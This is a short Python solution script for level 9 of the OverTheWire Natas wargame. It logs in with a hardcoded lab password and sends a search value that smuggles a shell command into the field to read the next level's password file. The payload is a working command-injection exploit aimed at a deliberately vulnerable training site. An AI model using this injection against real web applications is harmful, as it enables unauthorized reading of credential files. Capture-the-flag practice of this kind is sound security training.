import requests
import re

# level 8 => 9

Username = "natas9"
Password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

params = {"needle":"; cat /etc/natas_webpass/natas10 #","submit":"Search"}

session = requests.session()
url = "http://{}.natas.labs.overthewire.org".format(Username) 

response = session.post(url,auth=(Username,Password),data=params)

content = response.text



# print(content)
flag = re.findall('<pre>\n(.*)\n</pre>',content)[0]
print(flag)